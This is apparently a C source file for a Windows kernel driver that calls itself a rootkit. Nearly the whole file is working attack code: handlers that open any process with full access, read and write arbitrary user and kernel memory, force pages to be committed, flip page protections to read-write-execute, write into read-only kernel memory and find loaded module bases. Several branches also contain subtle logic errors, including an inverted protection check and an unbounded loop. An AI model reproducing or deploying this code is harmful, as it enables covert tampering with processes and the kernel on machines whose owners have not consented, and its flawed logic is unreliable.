#include "requests.h"


/*
================
HELPER FUCTIONS:
================
*/


HANDLE GetProcessHandle(ULONG64 PID, ULONG ProcAtri, ACCESS_MASK ProcAcc) {
	HANDLE DstProc = NULL;
	CLIENT_ID ProcHandle;
	OBJECT_ATTRIBUTES ProcAttr;
	InitializeObjectAttributes(&ProcAttr, NULL, ProcAtri, NULL, NULL);

	ProcHandle.UniqueProcess = (HANDLE)PID;
	ProcHandle.UniqueThread = NULL;

	NTSTATUS status = ZwOpenProcess(&DstProc, ProcAcc, &ProcAttr, &ProcHandle);
	if (!NT_SUCCESS(status)) {
		return NULL;
	}
	return DstProc;
}




BOOL ForceCommitMemRegions(HANDLE PID, PVOID Address, SIZE_T Size, ULONG AllocState, ULONG AllocProt) {
	/*
	Forcefully commits a range of pages in processes memory (Address + Size, filled to sides)
	ASSUMES: KeAttach was used successfully before the function and is still available
	*/


	// Check if ok with query -
	PMEMORY_BASIC_INFORMATION info;
	NTSTATUS status;
	PVOID Info = NULL;

	// Allocate the range of pages in processes virtual memory with the required allocation type and protection settings -
	status = ZwAllocateVirtualMemory(PID, &Address, NULL, &Size, AllocState, AllocProt);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}


	// Validate committing success with query -
	Info = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MEMORY_BASIC_INFORMATION), 0x7EE78BB8);
	if (!Info) {
		DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST COULD NOT ALLOCATE MEMORY FOR MEMORY QUERY :(\n");
		return FALSE;
	}

	// Query -
	status = ZwQueryVirtualMemory(PID, Address, MemoryBasicInformation, Info, sizeof(MEMORY_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST FAILED VIRTMEM QUERY :(\n");
		ExFreePool(Info);
		return FALSE;
	}
	info = (PMEMORY_BASIC_INFORMATION)Info;

	if (!(info->State & AllocState)) {
		ExFreePool(Info);
		return FALSE;
	}
	return TRUE;
}




BOOL ChangeProtectionSettings(HANDLE PID, PVOID Address, ULONG Size, ULONG ProtSettings, ULONG ExcludeProtStgs, MEMORY_BASIC_INFORMATION* InitInfo) {
	/*
	Change protection setttings of a range of pages (Address + Size, filled to sides)
	ASSUMES: KeAttach was used successfully before the function and is still available
	*/

	MEMORY_BASIC_INFORMATION* InfoPnt;
	// Change the protection settings of the whole memory range -
	NTSTATUS success = ZwProtectVirtualMemory(PID, &Address, &Size, ProtSettings, &InitInfo->Protect);
	if (!NT_SUCCESS(success)) {
		return FALSE;
	}


	// Allocate memory for destination query of memory -
	PVOID Info = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MEMORY_BASIC_INFORMATION), 0x7EE78BB8);
	if (!Info) {
		DbgPrintEx(0, 0, "KMDFdriver ChangeProtectionSettings REQUEST COULD NOT ALLOCATE MEMORY FOR MEMORY QUERY (SECOND) :(\n");
		return FALSE;
	}

	// Query -
	NTSTATUS status = ZwQueryVirtualMemory(PID, Address, MemoryBasicInformation, Info, sizeof(MEMORY_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver ChangeProtectionSettings REQUEST FAILED VIRTMEM QUERY (SECOND) :(\n");
		ExFreePool(Info);
		return FALSE;
	}

	InfoPnt = (MEMORY_BASIC_INFORMATION*)Info;
	if ((InfoPnt->Protect & ProtSettings) && !(InfoPnt->Protect & ExcludeProtStgs)) {
		ExFreePool(Info);
		return TRUE;
	}
	ExFreePool(Info);
	return FALSE;
}


/*
========================
ACTUAL REQUEST FUCTIONS:
========================
*/


RKSYSTEM_INFORET GetModuleBase64bit(PEPROCESS Process, UNICODE_STRING ModuleName) {
	RKSYSTEM_INFORET ModuleBaseRet;
	DbgPrintEx(0, 0, "KMDFdriver MODULE BASE REQUEST\n");
	PPEB PrcPeb = PsGetProcessPeb(Process);
	if (!PrcPeb) {
		DbgPrintEx(0, 0, "KMDFdriver COULD NOT GET PROCESS PEB :(\n");
		ModuleBaseRet.Buffer = NULL;
		ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_PRCPEB;
		return ModuleBaseRet;
	}

	KAPC_STATE state;
	KeStackAttachProcess(Process, &state);  // Attach to the process
	PPEB_LDR_DATA PrcLdr = (PPEB_LDR_DATA)PrcPeb->Ldr;
	if (!PrcLdr) {
		KeUnstackDetachProcess(&state);  // Deattach from the process
		DbgPrintEx(0, 0, "KMDFdriver NO LOADED MODULES AT ALL (LDR = NULL) :(\n");
		ModuleBaseRet.Buffer = NULL;
		ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_NOLOADEDDLLS;
		return ModuleBaseRet;
	}

	for (PLIST_ENTRY list = (PLIST_ENTRY)PrcLdr->ModuleListLoadOrder.Flink; list != &PrcLdr->ModuleListLoadOrder; list = (PLIST_ENTRY)list->Flink) {
		PLDR_DATA_TABLE_ENTRY PrcEntry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
		if (RtlCompareUnicodeString(&PrcEntry->BaseDllName, &ModuleName, TRUE) == NULL) {
			ULONG64 BaseAddr = (ULONG64)PrcEntry->DllBase;  // Found process module (DLL) by its name in the process modules list
			KeUnstackDetachProcess(&state);  // Deattach from the process
			ModuleBaseRet.Buffer = (PVOID)1;
			ModuleBaseRet.BufferSize = BaseAddr;
			return ModuleBaseRet;
		}
	}
	KeUnstackDetachProcess(&state);  // Deattach from the process, did not work
	DbgPrintEx(0, 0, "KMDFdriver FAILED TO GET MODULE BASE :(\n");
	ModuleBaseRet.Buffer = NULL;
	ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_OTHER;
	return ModuleBaseRet;
}


NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST\n");

	PEPROCESS EpTo;
	PEPROCESS EpFrom;
	KAPC_STATE ToState;
	MEMORY_BASIC_INFORMATION ToInfo;
	NTSTATUS status;
	HANDLE ToHandle;

	// if both are in kernel mode, buffers or addresses -
	if ((ULONG64)RootkInst->Out >= 0x7FFFFFFFFFFFFFFF && (ULONG64)RootkInst->Buffer >= 0x7FFFFFFFFFFFFFFF && strcmp(RootkInst->MdlName, "regular") != 0) {
		if (WriteToReadOnlyMemory(RootkInst->Out, RootkInst->Buffer, RootkInst->Size)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST BOTH KERNEL BUT COPY SUCCEEDED\n");
			RootkInst->Status = STATUS_SUCCESS;
			RootkInst->StatusCode = ROOTKSTATUS_SUCCESS;
			return STATUS_SUCCESS;
		}

		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - BOTH KERNEL BUT COPY FAILED\n");
			RootkInst->Status = STATUS_UNSUCCESSFUL;
			RootkInst->StatusCode = ROOTKSTATUS_COPYFAIL;
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Destination EPROCESS -
	if ((ULONG64)RootkInst->Out >= 0x7FFFFFFFFFFFFFFF) {
		EpTo = PsGetCurrentProcess();
	}

	else if ((ULONG64)RootkInst->Out != 0) {
		PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpTo);
	}

	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID DESTINATION ARGUMENTS (WRITING TO ADDRESS = 0)\n");
		RootkInst->Status = STATUS_UNSUCCESSFUL;
		RootkInst->StatusCode = ROOTKSTATUS_INVARGS;
		return STATUS_UNSUCCESSFUL;
	}

	// Source EPROCESS -
	if (strcmp(RootkInst->MdlName, "regular") == 0 || (ULONG64)RootkInst->Buffer >= 0x7FFFFFFFFFFFFFFF) {
		EpFrom = PsGetCurrentProcess();
	}

	else if ((ULONG64)RootkInst->Buffer != 0) {
		PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpFrom);
	}

	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID SOURCE ARGUMENTS (WRITING FROM ADDRESS = 0)\n");
		RootkInst->Status = STATUS_UNSUCCESSFUL;
		RootkInst->StatusCode = ROOTKSTATUS_INVARGS;
		return STATUS_UNSUCCESSFUL;
	}


	// Check for invalid arguments -
	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID ARGS SIZE/BUFFER/OUT\n");
		RootkInst->Status = STATUS_UNSUCCESSFUL;
		RootkInst->StatusCode = ROOTKSTATUS_ADRBUFSIZE;
		return STATUS_UNSUCCESSFUL;
	}


	// Check if writing destination can be written into -
	if (!((ULONG64)RootkInst->Out >= 0x7FFFFFFFFFFFFFFF)) {
		ToHandle = GetProcessHandle(RootkInst->MainPID, OBJ_KERNEL_HANDLE, PROCESS_ALL_ACCESS);
		if (ToHandle == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - TO HANDLE = NULL\n");
			RootkInst->Status = STATUS_UNSUCCESSFUL;
			RootkInst->StatusCode = ROOTKSTATUS_PROCHANDLE;
			return STATUS_UNSUCCESSFUL;
		}

		KeStackAttachProcess(EpTo, &ToState);
		status = ZwQueryVirtualMemory(ToHandle, RootkInst->Out, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - QUERY VIRTUAL MEMORY FAILED\n");
			RootkInst->Status = STATUS_UNSUCCESSFUL;
			RootkInst->StatusCode = ROOTKSTATUS_QUERYVIRTMEM;
			KeUnstackDetachProcess(&ToState);
			ZwClose(ToHandle);
			return STATUS_UNSUCCESSFUL;
		}

		if (((ULONG64)ToInfo.BaseAddress + ToInfo.RegionSize) < ((ULONG64)RootkInst->Out + RootkInst->Size)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - WRONG SIZE + OUTPUT ADDRESS\n");
			RootkInst->Status = STATUS_UNSUCCESSFUL;
			RootkInst->StatusCode = ROOTKSTATUS_INVARGS;
			KeUnstackDetachProcess(&ToState);
			ZwClose(ToHandle);
			return STATUS_UNSUCCESSFUL;
		}

		if (!(ToInfo.State & MEM_COMMIT)) {
			if (!ForceCommitMemRegions(ToHandle, RootkInst->Out, RootkInst->Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) {
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT COMMIT / NOT COMMITTED\n");
				RootkInst->Status = STATUS_UNSUCCESSFUL;
				RootkInst->StatusCode = ROOTKSTATUS_NOTCOMMITTED;
				KeUnstackDetachProcess(&ToState);
				ZwClose(ToHandle);
				return STATUS_UNSUCCESSFUL;
			}
		}

		if (!(ToInfo.Protect & PAGE_EXECUTE_READWRITE | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY && !(ToInfo.Protect & PAGE_GUARD | PAGE_NOACCESS))) {
			if (ChangeProtectionSettings(ToHandle, RootkInst->Out, (ULONG)RootkInst->Size, PAGE_EXECUTE_READWRITE | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY, PAGE_GUARD | PAGE_NOACCESS, &ToInfo)) {
				DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - DO NOT HAVE WRITE PERMISSIONS\n");
				RootkInst->Status = STATUS_UNSUCCESSFUL;
				RootkInst->StatusCode = ROOTKSTATUS_NOWRITEPRMS;
				KeUnstackDetachProcess(&ToState);
				ZwClose(ToHandle);
				return STATUS_UNSUCCESSFUL;
			}
		}
		ZwClose(ToHandle);
	}


	// Copy virtual memory (k-u, r-k/u, u-k/u) failure-
	if (!MmCopyVirtualMemory(EpFrom, RootkInst->Buffer, EpTo, RootkInst->Out, RootkInst->Size, KernelMode, NULL)) {
		if (!((ULONG64)RootkInst->Out >= 0x7FFFFFFFFFFFFFFF) && (ULONG64)RootkInst->Buffer < 0x7FFFFFFFFFFFFFFF && strcmp(RootkInst->MdlName, "regular") != 0) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - COPY FAILED, BOTH USER MODE\n");
		}

		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - COPY FAILED, ONE-ONE\n");
		}

		RootkInst->Status = STATUS_UNSUCCESSFUL;
		RootkInst->StatusCode = ROOTKSTATUS_COPYFAIL;
		KeUnstackDetachProcess(&ToState);
		return STATUS_UNSUCCESSFUL;
	}


	// Copy virtual memory (k-u, r-k/u, u-k/u) success-
	if (!((ULONG64)RootkInst->Out >= 0x7FFFFFFFFFFFFFFF) && (ULONG64)RootkInst->Buffer < 0x7FFFFFFFFFFFFFFF && strcmp(RootkInst->MdlName, "regular") != 0) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST BOTH USERMODE BUT COPY SUCCEEDED\n");
	}

	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST NOT BOTH KERNEL BUT COPY SUCCEEDED\n");
	}

	KeUnstackDetachProcess(&ToState);
	RootkInst->Status = STATUS_SUCCESS;
	RootkInst->StatusCode = ROOTKSTATUS_SUCCESS;
	return STATUS_SUCCESS;
}




NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST\n");

	PEPROCESS EpFrom;
	NTSTATUS status;
	SIZE_T ReadBytes;

	// Check for invalid arguments -
	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - INVALID ARGS SIZE/BUFFER/OUT\n");
		RootkInst->Status = STATUS_UNSUCCESSFUL;
		RootkInst->StatusCode = ROOTKSTATUS_ADRBUFSIZE;
		return STATUS_UNSUCCESSFUL;
	}

	// Copy into memory if buffer of reading is a virtual address inside another process / kernelspace address -
	if ((ULONG64)RootkInst->Buffer != 0) {

		if ((ULONG64)RootkInst->Buffer >= 0x7FFFFFFFFFFFFFFF) {
			EpFrom = PsGetCurrentProcess();
			DbgPrintEx(0, 0, "KMDFdriver PERFORMING READ REQUEST FROM KERNEL MODE\n");
		}
		else {
			PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpFrom);
			DbgPrintEx(0, 0, "KMDFdriver PERFORMING READ REQUEST FROM USER MODE\n");
		}

		status = MmCopyVirtualMemory(EpFrom, RootkInst->Buffer, PsGetCurrentProcess(), RootkInst->Out, RootkInst->Size, KernelMode, &ReadBytes);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - COPY DIDNT SUCCEED\n");
			RootkInst->Status = STATUS_UNSUCCESSFUL;
			RootkInst->StatusCode = ROOTKSTATUS_COPYFAIL;
			return STATUS_UNSUCCESSFUL;
		}

		if (ReadBytes != RootkInst->Size) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST SUCCEEDED WITH UNMATCHING SIZES (%llu, %llu) - COPY SUCCEEDED\n", RootkInst->Size, ReadBytes);
			RootkInst->Status = STATUS_SUCCESS;
			RootkInst->StatusCode = ROOTKSTATUS_LESSTHNREQ;
			return STATUS_SUCCESS;
		}

		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST SUCCEEDED - COPY SUCCEEDED\n");
		RootkInst->Status = STATUS_SUCCESS;
		RootkInst->StatusCode = ROOTKSTATUS_SUCCESS;
		return STATUS_SUCCESS;
	}

	// Reading source address = 0 -
	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - INVALID ARGUMENTS (READING FROM ADDRESS = 0)\n");
		RootkInst->Status = STATUS_UNSUCCESSFUL;
		RootkInst->StatusCode = ROOTKSTATUS_INVARGS;
		return STATUS_UNSUCCESSFUL;
	}
}




void PrintMsgFromKrnl(const char* Message)
{
	DbgPrintEx(0, 0, "KMDFdriver PRINT MESSAGE REQUEST\n");
	DbgPrintEx(0, 0, "KMDFdriver Message: %s\n", Message);
}




ROOTKIT_STATUS RetSystemInformation(PVOID DstBuffer, PVOID SrcBuffer, ULONG BufferSize, DWORD RequestNum) {
	DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION REQUEST NUMBER %u\n", RequestNum);

	NTSTATUS CopyResult = MmCopyVirtualMemory(PsGetCurrentProcess(), SrcBuffer, PsGetCurrentProcess(), DstBuffer, BufferSize, KernelMode, NULL);
	if (!NT_SUCCESS(CopyResult)) {
		DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION REQUEST NUMBER %u FAILED COPYING WITH MmCopyVirtualMemory()\n", RequestNum);
		return ROOTKSTATUS_COPYFAIL;

	}
	ExFreePool(SrcBuffer);
	DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION REQUEST NUMBER %u SUCCEEDED COPYING WITH MmCopyVirtualMemory()\n", RequestNum);
	return ROOTKSTATUS_SUCCESS;
}




RKSYSTEM_INFORET RequestSystemInfo(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum) {
	NTSTATUS status;
	PVOID Buffer = NULL;
	ULONG BufferSizeInc = 1024;
	ULONG InitBufferSize = 1024;
	ULONG BufferSize;
	RKSYSTEM_INFORET SysInfoRet;
	DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST NUMBER %u\n", SysInfNum);
	DbgPrintEx(0, 0, "KMDFdriver RequestSysteminfo REQUESTED INFO TYPE - %u\n", InfoType);

	while (InitBufferSize <= 0xFFFFFFFF) {
		DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST TRYING WITH BUFFER SIZE OF %u..\n", InitBufferSize);

		// Allocate an inital buffer -
		Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, InitBufferSize, (ULONG)Flag);
		if (!Buffer) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST COULD NOT ALLOCATE MEMORY (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_MEMALLOC;
			return SysInfoRet;
		}

		// Query the required buffer size -
		status = ZwQuerySystemInformation(InfoType, Buffer, InitBufferSize, &BufferSize);
		if (NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST SUCCEEDED FIRST TRY (INITIAL=%u,ACTUAL=%u)\n", InitBufferSize, BufferSize);
			SysInfoRet.BufferSize = BufferSize;
			SysInfoRet.Buffer = Buffer;
			return SysInfoRet;
		}

		else if (status == STATUS_INFO_LENGTH_MISMATCH || status == 0xC0000004 || status == -1073741820) {
			// Allocate memory -
			status = 0;
			ExFreePool(Buffer);
			Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, (ULONG)Flag);
			if (!Buffer) {
				DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST COULD NOT ALLOCATE MEMORY :(\n");
				SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_MEMALLOC;
				SysInfoRet.Buffer = NULL;
				return SysInfoRet;
			}

			// Query system information -
			status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, NULL);
			if (!NT_SUCCESS(status)) {
				DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH FAILED SYSTEM INFO QUERY :(\n");
				ExFreePool(Buffer);
				SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_QUERYVIRTMEM;
				SysInfoRet.Buffer = NULL;
				return SysInfoRet;
			}
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST SUCCEEDED AFTER STATUS_INFO_LENGTH_MISMATCH (INITIAL=%u,ACTUAL=%u)\n", InitBufferSize, BufferSize);

			SysInfoRet.BufferSize = BufferSize;
			SysInfoRet.Buffer = Buffer;
			return SysInfoRet;
		}

		else if (status == STATUS_ACCESS_VIOLATION || status == 0xC0000005 || status == -1073741819) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST MEMORY ACCESS VIOLATION (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_ACSVIO;
			ExFreePool(Buffer);
			return SysInfoRet;
		}

		else if (status == STATUS_NOT_SUPPORTED || status == 0xC00000BB || status == -1073741637) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST STATUS NOT SUPPORTED (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_NOTSUPPORTED;
			ExFreePool(Buffer);
			return SysInfoRet;
		}
		else {
			ExFreePool(Buffer);
			Buffer = NULL;
			InitBufferSize += BufferSizeInc;
		}
	}

	DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH FAILED ALLOCATING A VALID BUFFER FOR INFO (SIZE>0XFFFF / DIFFERENT ERRORS FOR QUERY EVERY TRY) :(\n");
	SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_OTHER;
	SysInfoRet.Buffer = NULL;
	return SysInfoRet;
}




RKSYSTEM_INFORET GetSystemInfoRetLen(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum) {
	RKSYSTEM_INFORET SysInfRet;
	SysInfRet = RequestSystemInfo(InfoType, Flag, SysInfNum);
	return SysInfRet;
}